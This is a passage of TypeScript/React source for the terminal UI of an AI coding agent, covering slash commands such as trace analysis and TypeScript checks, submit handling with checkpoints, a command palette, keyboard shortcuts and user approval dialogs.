                'Efficiency Analysis:',
                '',
                `Anomalies Detected: ${summary.anomalies.length}`,
              ];

              if (summary.anomalies.length === 0) {
                lines.push('  No significant issues detected.');
              } else {
                for (const anomaly of summary.anomalies) {
                  lines.push(`  [${anomaly.severity.toUpperCase()}] ${anomaly.type}`);
                  lines.push(`       ${anomaly.description}`);
                }
              }

              lines.push('', 'Tool Patterns:');
              lines.push(
                `  Unique tools used: ${Object.keys(summary.toolPatterns.frequency).length}`,
              );
              lines.push(`  Redundant calls:   ${summary.toolPatterns.redundantCalls.length}`);
              lines.push(`  Slow tools:        ${summary.toolPatterns.slowTools.length}`);

              if (summary.codeLocations.length > 0) {
                lines.push('', 'Related Code Locations:');
                for (const loc of summary.codeLocations) {
                  lines.push(`  [${loc.relevance.toUpperCase()}] ${loc.file} - ${loc.component}`);
                }
              }

              addMessage('system', lines.join('\n'));
            } catch (e) {
              addMessage('error', `Analysis failed: ${(e as Error).message}`);
            }
          } else if (args[0] === 'issues') {
            if (!traceCollector) {
              addMessage('system', 'Tracing is not enabled.');
              return;
            }

            const data = traceCollector.getSessionTrace();
            if (!data || !data.iterations || data.iterations.length === 0) {
              addMessage('system', 'No trace data to analyze.');
              return;
            }

            try {
              const { createTraceSummaryGenerator } = await import('../analysis/trace-summary.js');
              const generator = createTraceSummaryGenerator(data);
              const summary = generator.generate();

              if (summary.anomalies.length === 0) {
                addMessage('system', 'No issues detected in current session.');
              } else {
                const lines = ['Detected Issues:'];
                summary.anomalies.forEach((anomaly, i) => {
                  const icon =
                    anomaly.severity === 'high' ? '!' : anomaly.severity === 'medium' ? '*' : '-';
                  lines.push(`  ${icon} ${i + 1}. ${anomaly.type} (${anomaly.severity})`);
                  lines.push(`       ${anomaly.description}`);
                });
                addMessage('system', lines.join('\n'));
              }
            } catch (e) {
              addMessage('error', `Analysis failed: ${(e as Error).message}`);
            }
          } else if (args[0] === 'fixes') {
            try {
              const { createFeedbackLoopManager } = await import('../analysis/feedback-loop.js');
              const feedbackManager = createFeedbackLoopManager();
              const pendingFixes = feedbackManager.getPendingFixes();
              const stats = feedbackManager.getSummaryStats();

              const lines = [
                'Feedback Loop Summary:',
                `  Total analyses:     ${stats.totalAnalyses}`,
                `  Avg efficiency:     ${stats.avgEfficiencyScore}%`,
                `  Total fixes:        ${stats.totalFixes}`,
                `  Implemented:        ${stats.implementedFixes}`,
                `  Verified:           ${stats.verifiedFixes}`,
                '',
              ];

              if (pendingFixes.length === 0) {
                lines.push('No pending fixes.');
              } else {
                lines.push('Pending Fixes:');
                for (const fix of pendingFixes.slice(0, 5)) {
                  lines.push(`  - ${fix.description}`);
                }
                if (pendingFixes.length > 5) {
                  lines.push(`  ... and ${pendingFixes.length - 5} more`);
                }
              }

              feedbackManager.close();
              addMessage('system', lines.join('\n'));
            } catch (e) {
              addMessage('error', `Error loading feedback data: ${(e as Error).message}`);
            }
          } else {
            addMessage(
              'system',
              [
                'Usage:',
                '  /trace              - Show current session trace summary',
                '  /trace --analyze    - Run efficiency analysis',
                '  /trace issues       - List detected inefficiencies',
                '  /trace fixes        - List pending improvements',
              ].join('\n'),
            );
          }
          return;
        }

        case 'tsc': {
          const tcState = agent.getTypeCheckerState();
          if (!tcState?.tsconfigDir) {
            addMessage('system', 'No TypeScript project detected (no tsconfig.json found).');
            return;
          }
          addMessage('system', 'Running tsc --noEmit...');
          const tscResult = await runTypeCheck(tcState.tsconfigDir);
          tcState.lastResult = tscResult;
          tcState.tsEditsSinceLastCheck = 0;
          tcState.hasRunOnce = true;
          if (tscResult.success) {
            addMessage('system', `[ok] TypeScript compilation clean (${tscResult.duration}ms)`);
          } else {
            const summary = tscResult.errors
              .slice(0, 10)
              .map((e) => `  ${e.file}(${e.line},${e.column}): ${e.code} — ${e.message}`)
              .join('\n');
            addMessage(
              'system',
              `[X] ${tscResult.errorCount} TypeScript error(s) (${tscResult.duration}ms):\n${summary}`,
            );
          }
          transparencyAggregatorRef.current?.processEvent({
            type: 'diagnostics.tsc-check',
            errorCount: tscResult.errorCount,
            duration: tscResult.duration,
            trigger: 'manual',
          });
          return;
        }

        default:
          addMessage('system', `Unknown: /${cmd}. Try /help`);
      }
    },
    [
      addMessage,
      exit,
      agent,
      mcpClient,
      lspManager,
      sessionStore,
      compactor,
      model,
      currentThemeName,
      currentSessionId,
      formatSessionsTable,
      saveCheckpointToStore,
      persistPendingPlanToStore,
    ],
  );

  // =========================================================================
  // SUBMIT HANDLER
  // =========================================================================

  const handleSubmit = useCallback(
    async (input: string) => {
      const trimmed = input.trim();
      if (!trimmed) return;

      // Add to history (persistent)
      if (historyManagerRef.current) {
        historyManagerRef.current.addEntry(trimmed);
        setHistoryEntries(historyManagerRef.current.getHistory());
      }

      addMessage('user', trimmed);

      if (trimmed.startsWith('/')) {
        const parts = trimmed.slice(1).split(/\s+/);
        await handleCommand(parts[0], parts.slice(1));
        return;
      }

      // Set execution mode - unified event handler will display events
      setIsProcessing(true);
      executionModeRef.current = 'processing';
      setExecutionMode('processing');
      setStatus((s) => ({ ...s, mode: 'thinking' }));

      // Reset CPU time counter for per-prompt resource limits (prevents session-wide timeout)
      agent.resetResourceTimer();

      try {
        const autoLoop = await runWithIncompleteAutoLoop(agent, trimmed, {
          onRetry: (attempt, maxAttempts) => {
            setStatus((s) => ({ ...s, mode: `recovering ${attempt}/${maxAttempts}` }));
            addMessage('system', `[AUTO-LOOP] Retrying incomplete run (${attempt}/${maxAttempts})`);
          },
        });
        const result = autoLoop.result;
        const metrics = agent.getMetrics();
        const modeInfo = agent.getModeInfo();
        const completion = result.completion;
        const finalMode = completion.success
          ? modeInfo.name === 'Plan'
            ? 'ready (plan)'
            : 'ready'
          : completion.reason === 'open_tasks' ||
              completion.reason === 'future_intent' ||
              completion.reason === 'incomplete_action'
            ? 'incomplete'
            : 'failed';
        setStatus({
          iter: metrics.llmCalls,
          tokens: metrics.totalTokens,
          cost: metrics.estimatedCost,
          mode: finalMode,
        });

        // Calculate current context size (what's actually in the window now)
        const agentState = agent.getState();
        const estimateTokens = (str: string) => estimateTokenCount(str);
        const messageTokens = agentState.messages.reduce(
          (sum: number, m: any) =>
            sum +
            estimateTokens(typeof m.content === 'string' ? m.content : JSON.stringify(m.content)),
          0,
        );
        // Include system prompt overhead (codebase context, tools, rules)
        const systemPromptTokens = agent.getSystemPromptTokenEstimate?.() ?? 0;
        const currentContextTokens = messageTokens + systemPromptTokens;
        const contextLimit = agent.getMaxContextTokens();
        const contextPct = Math.round((currentContextTokens / contextLimit) * 100);

        const durationSec = (metrics.duration / 1000).toFixed(1);
        // Format: Session total (cumulative cost) | Current context (compaction awareness)
        const sessionIn =
          metrics.inputTokens >= 1000
            ? `${(metrics.inputTokens / 1000).toFixed(1)}k`
            : metrics.inputTokens.toLocaleString();
        const sessionOut =
          metrics.outputTokens >= 1000
            ? `${(metrics.outputTokens / 1000).toFixed(1)}k`
            : metrics.outputTokens.toLocaleString();
        const contextK = (currentContextTokens / 1000).toFixed(1);
        const metricsLine = `\n---\nSession: ${sessionIn} in / ${sessionOut} out | Context: ${contextK}k/${contextLimit / 1000}k (${contextPct}%) | ${metrics.toolCalls} tools | ${durationSec}s`;

        if (agent.hasPendingPlan()) {
          const plan = agent.getPendingPlan();
          if (plan) {
            // Auto-show the full plan instead of just a count
            const fullPlan = agent.formatPendingPlan();
            addMessage('assistant', (result.response || 'Planning complete.') + metricsLine);
            addMessage('system', fullPlan);
          }
        } else {
          const responseText =
            result.response != null && result.response.length > 0
              ? result.response
              : result.error || 'No response';
          if (!result.success) {
            if (result.completion.reason === 'open_tasks' && result.completion.openTasks) {
              addMessage(
                'system',
                `[INCOMPLETE] Open tasks remain: ${result.completion.openTasks.pending} pending, ${result.completion.openTasks.inProgress} in_progress, ${result.completion.openTasks.blocked} blocked`,
              );
            } else if (
              result.completion.reason === 'future_intent' ||
              result.completion.reason === 'incomplete_action'
            ) {
              addMessage(
                'system',
                `[INCOMPLETE] ${result.completion.details || 'Run ended with pending work.'}`,
              );
            }
            addMessage(
              'error',
              `[RUN FAILED] ${result.error || 'The agent did not complete this task successfully.'}`,
            );
          }
          addMessage('assistant', responseText + metricsLine);
        }

        const checkpoint = agent.autoCheckpoint(true);
        if (checkpoint) {
          addMessage('system', `[*] Auto-checkpoint: ${checkpoint.id}`);
          try {
            saveCheckpointToStore(sessionStore, {
              id: checkpoint.id,
              label: checkpoint.label,
              messages: checkpoint.state.messages,
              iteration: checkpoint.state.iteration,
              metrics: checkpoint.state.metrics,
              plan: checkpoint.state.plan,
              memoryContext: checkpoint.state.memoryContext,
            });
            persistPendingPlanToStore();
          } catch (e) {
            persistenceDebug.error('[TUI] Checkpoint failed', e);
          }
        }
      } catch (e) {
        addMessage('error', (e as Error).message);
      } finally {
        finishExecutionMode();
        setIsProcessing(false);
        setToolCalls([]);
      }
    },
    [
      addMessage,
      handleCommand,
      agent,
      sessionStore,
      saveCheckpointToStore,
      persistenceDebug,
      persistPendingPlanToStore,
      finishExecutionMode,
    ],
  );

  // =========================================================================
  // COMMAND PALETTE ITEMS
  // =========================================================================

  const commandPaletteItems: CommandPaletteItem[] = useMemo(
    () => [
      {
        id: 'help',
        label: 'Help',
        shortcut: '/help',
        category: 'General',
        action: () => handleCommand('help', []),
      },
      {
        id: 'status',
        label: 'Show Status',
        shortcut: '/status',
        category: 'General',
        action: () => handleCommand('status', []),
      },
      {
        id: 'clear',
        label: 'Clear Screen',
        shortcut: 'Ctrl+L',
        category: 'General',
        action: () => {
          setMessages([]);
          setToolCalls([]);
        },
      },
      {
        id: 'save',
        label: 'Save Session',
        shortcut: '/save',
        category: 'Sessions',
        action: () => handleCommand('save', []),
      },
      {
        id: 'sessions',
        label: 'List Sessions',
        shortcut: '/sessions',
        category: 'Sessions',
        action: () => handleCommand('sessions', []),
      },
      {
        id: 'load',
        label: 'Load Session',
        shortcut: '/load <id>',
        category: 'Sessions',
        action: () => handleCommand('sessions', []),
      }, // Shows sessions, user types /load <id>
      {
        id: 'context',
        label: 'Context Info',
        shortcut: '/context',
        category: 'Context',
        action: () => handleCommand('context', []),
      },
      {
        id: 'compact',
        label: 'Compact Context',
        shortcut: '/compact',
        category: 'Context',
        action: () => handleCommand('compact', []),
      },
      {
        id: 'mcp',
        label: 'MCP Servers',
        shortcut: '/mcp',
        category: 'MCP',
        action: () => handleCommand('mcp', []),
      },
      {
        id: 'mcp-tools',
        label: 'MCP Tools',
        shortcut: '/mcp tools',
        category: 'MCP',
        action: () => handleCommand('mcp', ['tools']),
      },
      {
        id: 'plan',
        label: 'Toggle Plan Mode',
        shortcut: '/plan',
        category: 'Plan',
        action: () => handleCommand('plan', []),
      },
      {
        id: 'show-plan',
        label: 'Show Plan',
        shortcut: '/show-plan',
        category: 'Plan',
        action: () => handleCommand('show-plan', []),
      },
      {
        id: 'approve',
        label: 'Approve Plan',
        shortcut: '/approve',
        category: 'Plan',
        action: () => handleCommand('approve', []),
      },
      {
        id: 'reject',
        label: 'Reject Plan',
        shortcut: '/reject',
        category: 'Plan',
        action: () => handleCommand('reject', []),
      },
      {
        id: 'tools',
        label: 'List Tools',
        shortcut: '/tools',
        category: 'Debug',
        action: () => handleCommand('tools', []),
      },
      {
        id: 'tsc',
        label: 'TypeScript Check',
        shortcut: '/tsc',
        category: 'Diagnostics',
        action: () => handleCommand('tsc', []),
      },
      {
        id: 'theme',
        label: 'Change Theme',
        shortcut: '/theme',
        category: 'Settings',
        action: () => handleCommand('theme', []),
      },
      {
        id: 'exit',
        label: 'Exit',
        shortcut: 'Ctrl+C',
        category: 'General',
        action: () => agent.cleanup().then(() => exit()),
      },
    ],
    [handleCommand, agent, exit],
  );

  // Get filtered command palette items for current query
  const filteredCommandItems = useMemo(() => {
    if (!commandPaletteQuery) return commandPaletteItems;
    const q = commandPaletteQuery.toLowerCase();
    return commandPaletteItems.filter(
      (item) =>
        item.label.toLowerCase().includes(q) ||
        item.id.toLowerCase().includes(q) ||
        (item.shortcut && item.shortcut.toLowerCase().includes(q)),
    );
  }, [commandPaletteItems, commandPaletteQuery]);

  // Handle command palette keyboard input (called from MemoizedInputArea)
  const handleCommandPaletteInput = useCallback(
    (input: string, key: any) => {
      // Escape closes palette
      if (key.escape) {
        setCommandPaletteOpen(false);
        setCommandPaletteQuery('');
        setCommandPaletteIndex(0);
        return;
      }

      // Enter selects item
      if (key.return) {
        const item = filteredCommandItems[commandPaletteIndex];
        if (item) {
          setCommandPaletteOpen(false);
          setCommandPaletteQuery('');
          setCommandPaletteIndex(0);
          item.action();
        }
        return;
      }

      // Arrow keys navigate
      if (key.upArrow) {
        setCommandPaletteIndex((i) => Math.max(0, i - 1));
        return;
      }
      if (key.downArrow) {
        setCommandPaletteIndex((i) => Math.min(filteredCommandItems.length - 1, i + 1));
        return;
      }

      // Backspace
      if (key.backspace || key.delete) {
        setCommandPaletteQuery((q) => q.slice(0, -1));
        setCommandPaletteIndex(0);
        return;
      }

      // Regular character input
      if (input && !key.ctrl && !key.meta) {
        setCommandPaletteQuery((q) => q + input);
        setCommandPaletteIndex(0);
      }
    },
    [filteredCommandItems, commandPaletteIndex],
  );

  // Handle approval deny reason input (called from MemoizedInputArea)
  const handleApprovalDenyReasonInput = useCallback(
    (input: string, key: any) => {
      // Enter submits the deny reason
      if (key.return) {
        handleDeny(denyReason || 'User denied');
        return;
      }

      // Backspace
      if (key.backspace || key.delete) {
        setDenyReason((r) => r.slice(0, -1));
        return;
      }

      // Regular character input
      if (input && !key.ctrl && !key.meta) {
        setDenyReason((r) => r + input);
      }
    },
    [denyReason, handleDeny],
  );

  // =========================================================================
  // KEYBOARD CALLBACKS
  // =========================================================================

  const handleCtrlC = useCallback(() => {
    // Clear any existing timer
    if (ctrlCTimerRef.current) {
      clearTimeout(ctrlCTimerRef.current);
      ctrlCTimerRef.current = null;
    }

    setCtrlCCount((prevCount) => {
      const newCount = prevCount + 1;

      if (newCount >= 2) {
        // Second Ctrl+C within timeout window - force exit immediately
        process.exit(1);
      }

      // First Ctrl+C - show warning and start graceful cleanup
      addMessage('system', '[CTRL+C] Press again within 1s to force exit...');

      // Start graceful cleanup in background
      agent
        .cleanup()
        .then(() => mcpClient.cleanup())
        .then(() => lspManager.cleanup())
        .then(() => exit())
        .catch(() => exit()); // Exit even if cleanup fails

      // Reset counter after 1 second
      ctrlCTimerRef.current = setTimeout(() => {
        setCtrlCCount(0);
        ctrlCTimerRef.current = null;
      }, 1000);

      return newCount;
    });
  }, [agent, mcpClient, lspManager, exit, addMessage]);

  const handleCtrlL = useCallback(() => {
    setMessages([]);
    setToolCalls([]);
  }, []);

  const handleCtrlP = useCallback(() => {
    setCommandPaletteOpen((prev) => !prev);
    setCommandPaletteQuery('');
    setCommandPaletteIndex(0);
  }, []);

  const handleEscape = useCallback(async () => {
    // Close command palette first if open
    if (commandPaletteOpen) {
      setCommandPaletteOpen(false);
      setCommandPaletteQuery('');
      setCommandPaletteIndex(0);
      return;
    }
    // Otherwise cancel processing
    if (isProcessingRef.current) {
      // Immediate visual feedback
      addMessage('system', '[ESC] Stopping agent...');

      // Autosave checkpoint before cancel (async, don't block)
      try {
        const agentState = agent.getState();
        saveCheckpointToStore(sessionStore, {
          sessionId: currentSessionId,
          reason: 'user_cancel',
          messages: agentState.messages,
          iteration: agentState.iteration,
          timestamp: Date.now(),
        });
        persistPendingPlanToStore();
        persistenceDebug.log('Checkpoint saved before cancel');
      } catch (e) {
        persistenceDebug.error('Failed to save checkpoint before cancel', e);
      }

      // Cancel the agent
      agent.cancel('Cancelled by ESC');
      finishExecutionMode();
      setIsProcessing(false);
      addMessage('system', '[STOP] Cancelled (checkpoint saved)');
    }
  }, [
    agent,
    addMessage,
    commandPaletteOpen,
    sessionStore,
    currentSessionId,
    saveCheckpointToStore,
    persistenceDebug,
    persistPendingPlanToStore,
    finishExecutionMode,
  ]);

  const handleToggleToolExpand = useCallback(() => {
    setToolCallsExpanded((prev) => {
      addMessage('system', !prev ? '[*] Tool details: expanded' : '[ ] Tool details: collapsed');
      return !prev;
    });
  }, [addMessage]);

  const handleToggleThinking = useCallback(() => {
    setShowThinking((prev) => {
      addMessage('system', !prev ? '[*] Thinking: verbose' : '[ ] Thinking: minimal');
      return !prev;
    });
  }, [addMessage]);

  const handleToggleTransparency = useCallback(() => {
    setTransparencyExpanded((prev) => {
      addMessage(
        'system',
        !prev ? '[v] Transparency panel: visible' : '[^] Transparency panel: hidden',
      );
      return !prev;
    });
  }, [addMessage]);

  const handleToggleActiveAgents = useCallback(() => {
    setActiveAgentsExpanded((prev) => {
      addMessage('system', !prev ? '[v] Active agents: visible' : '[^] Active agents: hidden');
      return !prev;
    });
  }, [addMessage]);

  const handleToggleTasks = useCallback(() => {
    setTasksExpanded((prev) => {
      addMessage('system', !prev ? '[v] Tasks: visible' : '[^] Tasks: hidden');
      return !prev;
    });
  }, [addMessage]);

  const handleToggleDebug = useCallback(() => {
    setDebugExpanded((prev) => {
      addMessage('system', !prev ? '[v] Debug panel: visible (Alt+D)' : '[^] Debug panel: hidden');
      return !prev;
    });
  }, [addMessage]);

  const handleToggleSwarm = useCallback(() => {
    setSwarmExpanded((prev) => !prev);
  }, []);

  const handleToggleDiagnostics = useCallback(() => {
    setDiagExpanded((prev) => {
      addMessage('system', !prev ? '[d] Diagnostics: visible (Alt+Y)' : '[^] Diagnostics: hidden');
      return !prev;
    });
  }, [addMessage]);

  // modelShort, contextPct, costStr, elapsedTime, budgetPct are now computed inside StatusBar

  // Memoize DiagnosticsPanel props to avoid method calls in render body
  const diagTypeCheckerState = useMemo(() => agent.getTypeCheckerState(), [agent]);
  const diagAstCacheStats = useMemo(() => diagExpanded ? getASTCacheStats() : null, [diagExpanded, transparencyState]);

  // =========================================================================
  // RENDER
  // =========================================================================

  return (
    <>
      {/* Static messages - rendered once, never re-render */}
      <Static items={messages}>
        {(m: TUIMessage) => <MessageItem key={m.id} msg={m} colors={colors} />}
      </Static>

      {/* Dynamic section */}
      <Box flexDirection="column">
        {/* Tool calls panel (memoized — only re-renders on tool call changes) */}
        <ToolCallsPanel toolCalls={toolCalls} expanded={toolCallsExpanded} colors={colors} />

        {/* Transparency Panel (memoized — toggle with Alt+I) */}
        <TransparencyPanel
          transparencyState={transparencyState}
          expanded={transparencyExpanded}
          colors={colors}
        />

        {/* Approval Dialog (positioned above input when active) */}
        {pendingApproval && approvalRequest && (
          <ApprovalDialog
            visible={true}
            request={approvalRequest}
            onApprove={handleApprove}
            onDeny={handleDeny}
            colors={colors}
            denyReasonMode={denyReasonMode}
            denyReason={denyReason}
          />
        )}

        {/* Budget Extension Dialog (positioned above input when active) */}
        {pendingBudgetExtension && (
          <BudgetExtensionDialog
            visible={true}
            request={pendingBudgetExtension}
            onApprove={handleBudgetExtensionApprove}
            onDeny={handleBudgetExtensionDeny}
            colors={colors}
          />
        )}

        {/* Learning Validation Dialog (positioned above input when active) */}
        {pendingLearning && (
          <LearningValidationDialog
            visible={true}
            learning={pendingLearning}
            onApprove={handleLearningApprove}
            onReject={handleLearningReject}
            onSkip={handleLearningSkip}
            colors={colors}
          />
        )}

        {/* Diagnostics Panel (toggle with Alt+Y) */}
        <DiagnosticsPanel
          diagnostics={transparencyState?.diagnostics ?? EMPTY_DIAGNOSTICS}
          typeCheckerState={diagTypeCheckerState}
          astCacheStats={diagAstCacheStats}
          expanded={diagExpanded}
          colors={colors}
        />

        {/* Debug Panel (toggle with Alt+D) */}
        <DebugPanel entries={debugBuffer.entries} expanded={debugExpanded} colors={colors} />

        {/* Tasks Panel (positioned above input for task tracking) */}
        <TasksPanel tasks={tasks} colors={colors} expanded={tasksExpanded} />

        {/* Active Agents Panel (positioned above input when agents are running) */}
        <ActiveAgentsPanel agents={activeAgents} colors={colors} expanded={activeAgentsExpanded} />

        {/* Swarm Status Panel (visible when swarm mode is active) */}
        <SwarmStatusPanel status={swarmStatus} colors={colors} expanded={swarmExpanded} />

        {/* Interactive Plan Panel (visible when a plan is active) */}
        <PlanPanel plan={activePlan} expanded={planExpanded} colors={colors} />

        <MemoizedInputArea
          onSubmit={handleSubmit}
          disabled={isProcessing || !!pendingApproval || !!pendingBudgetExtension || !!pendingLearning}
          borderColor={pendingApproval || pendingBudgetExtension ? '#FFD700' : pendingLearning ? '#87CEEB' : '#87CEEB'}
          textColor="#98FB98"
          cursorColor="#87CEEB"
          onCtrlC={handleCtrlC}
          onCtrlL={handleCtrlL}
          onCtrlP={handleCtrlP}
          onEscape={handleEscape}
          onToggleToolExpand={handleToggleToolExpand}
          onToggleThinking={handleToggleThinking}
          onToggleTransparency={handleToggleTransparency}
          onToggleActiveAgents={handleToggleActiveAgents}
          onToggleTasks={handleToggleTasks}
          onToggleDebug={handleToggleDebug}
          onToggleSwarm={handleToggleSwarm}
          onToggleDiagnostics={handleToggleDiagnostics}
          commandPaletteOpen={commandPaletteOpen}
          onCommandPaletteInput={handleCommandPaletteInput}
          approvalDialogOpen={!!pendingApproval}
          approvalDenyReasonMode={denyReasonMode}
          onApprovalApprove={handleApprove}
          onApprovalAlwaysAllow={handleAlwaysAllow}
          onApprovalDeny={handleDeny}
          onApprovalDenyWithReason={handleDenyWithReason}
          onApprovalCancelDenyReason={handleCancelDenyReason}
          onApprovalDenyReasonInput={handleApprovalDenyReasonInput}
          budgetExtensionDialogOpen={!!pendingBudgetExtension}
          onBudgetExtensionApprove={handleBudgetExtensionApprove}
          onBudgetExtensionDeny={handleBudgetExtensionDeny}
          learningValidationDialogOpen={!!pendingLearning}
          onLearningApprove={handleLearningApprove}
          onLearningReject={handleLearningReject}
          onLearningSkip={handleLearningSkip}
          history={historyEntries}
        />

        {/* Command Palette (positioned above input) */}
        {commandPaletteOpen && (
          <ControlledCommandPalette
            theme={selectedTheme}
            items={filteredCommandItems}
            visible={commandPaletteOpen}
            query={commandPaletteQuery}
            selectedIndex={commandPaletteIndex}
            onQueryChange={setCommandPaletteQuery}
            onSelectItem={(item) => {
              setCommandPaletteOpen(false);
              setCommandPaletteQuery('');
              setCommandPaletteIndex(0);
              item.action();
            }}
            onClose={() => {
              setCommandPaletteOpen(false);
              setCommandPaletteQuery('');
              setCommandPaletteIndex(0);
            }}
          />
        )}

        {/* Status bar (memoized — colocates elapsed/context/budget state) */}
        <StatusBar
          isProcessing={isProcessing}
          status={statusForBar}
          colors={colors}
          model={model}
          gitBranch={gitBranch}
          transparencyState={transparencyState}
          agent={agent}
        />
      </Box>
    </>
  );
}

export default TUIApp;
